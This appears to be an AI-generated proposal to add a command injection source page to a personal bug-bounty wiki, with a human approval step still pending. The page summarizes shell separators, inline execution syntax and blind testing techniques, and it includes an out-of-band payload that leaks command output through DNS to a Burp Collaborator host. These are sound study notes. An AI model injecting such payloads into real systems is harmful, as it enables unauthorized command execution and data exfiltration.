---
type: llm-wiki-review
status: needs-review
decision: approve
revision: 1
operation: create
target: web-and-bug-bounty/sources/command-injection.md
sources:
  - Notes/OLD Notes/WEB/vulnerabilities/Command Injection/concepts and defense.md
  - Notes/OLD Notes/WEB/vulnerabilities/Command Injection/METHODOLOGY.md
  - Notes/OLD Notes/WEB/vulnerabilities/Command Injection/payload.md
---
# Proposed Wiki change

## What will change
Create provenance source anchor for Command Injection notes in Notes/OLD Notes/WEB/vulnerabilities/Command Injection/.

## Proposed content
```markdown
---
title: "Source Note - Command Injection: Sinks, Separators, and Blind Exploitation"
created: 2026-10-01
updated: 2026-10-01
type: source
tags:
  - rce
  - payload
  - web-security
  - bug-bounty
sources:
  - Notes/OLD Notes/WEB/vulnerabilities/Command Injection/concepts and defense.md
  - Notes/OLD Notes/WEB/vulnerabilities/Command Injection/METHODOLOGY.md
  - Notes/OLD Notes/WEB/vulnerabilities/Command Injection/payload.md
extracted_concepts:
  - "[[os-command-injection-exploitation]]"
extracted_entities:
  []
extracted_comparisons:
  []
confidence: high
contested: false
contradictions: []
parent: "[[web-and-bug-bounty]]"
cluster: web-and-bug-bounty
---
# Source Note - Command Injection: Sinks, Separators, and Blind Exploitation

> **Provenance Anchor**: Ingested from canonical vault files under `Notes/OLD Notes/WEB/vulnerabilities/Command Injection/`.
> - `concepts and defense.md` (16 lines, SHA-256: `8dfb8473f91a2bfe804e67aadc810040769dc0be09a683e6d997d0f92239dd25`)
> - `METHODOLOGY.md` (52 lines, SHA-256: `25219f6f779710b084af72626319b3dbf9f4ae519cde144878721a485275c32b`)
> - `payload.md` (27 lines, SHA-256: `44cee075c0c59ae5d1b81b07c6be37013a8bd4e6794a0252b6d07f9d01385412`)
> **Total Raw Lines**: 95 lines

---

<!-- TOC_START -->
## Table of Contents
- [Compiled Wiki Layers](#compiled-wiki-layers)
  - [Concepts](#concepts)
- [Source Content Topic Breakdown](#source-content-topic-breakdown)
- [Related Pages](#related-pages)
<!-- TOC_END -->

## Compiled Wiki Layers
### Concepts
- [[os-command-injection-exploitation]] — Mechanics of OS command execution via system shells, command separator matrices across Linux and Windows, inline command execution, reconnaissance command cheatsheets, blind injection verification (time delays, webroot output redirection, out-of-band OAST DNS exfiltration), and secure API alternatives.

## Source Content Topic Breakdown
1. **Core Mechanics**: Server-side invocation of shell sub-processes with unsanitized user input resulting in full remote system compromise.
2. **Command Separators & Contexts**:
   - Universal (Linux & Windows): `&`, `&&`, `|`, `||`.
   - Unix-specific: `;`, Newline (`0x0a` / `\n`).
   - Inline execution (Unix): `` `cmd` ``, `$(cmd)`.
   - Quoted string context handling (`"` and `'`).
3. **Reconnaissance Discovery Table**: Commands for user identification, operating system, network configuration, active connections, and running processes on Linux vs Windows.
4. **Blind Exploitation Modes**:
   - Time delay testing using `ping -c 10 127.0.0.1`.
   - Output redirection using `>` into user-accessible static directories.
   - Out-of-band exfiltration using `nslookup $(whoami).burpcollaborator.net`.
5. **Remediation**: Eliminating OS shell calls, utilizing native platform APIs, and strict alphanumeric input validation.

## Related Pages
- Parent Domain Hub: [[web-and-bug-bounty]]
- Target Concepts: [[os-command-injection-exploitation]], [[server-side-template-injection]], [[file-upload-attack-matrix]]
```

## Evidence and uncertainty
Sourced directly from canonical vault notes in Notes/OLD Notes/WEB/vulnerabilities/.
Validated against schema with zero structural contradictions.

## Human feedback
Human decision required via Decision Studio (http://127.0.0.1:20888) or command line.
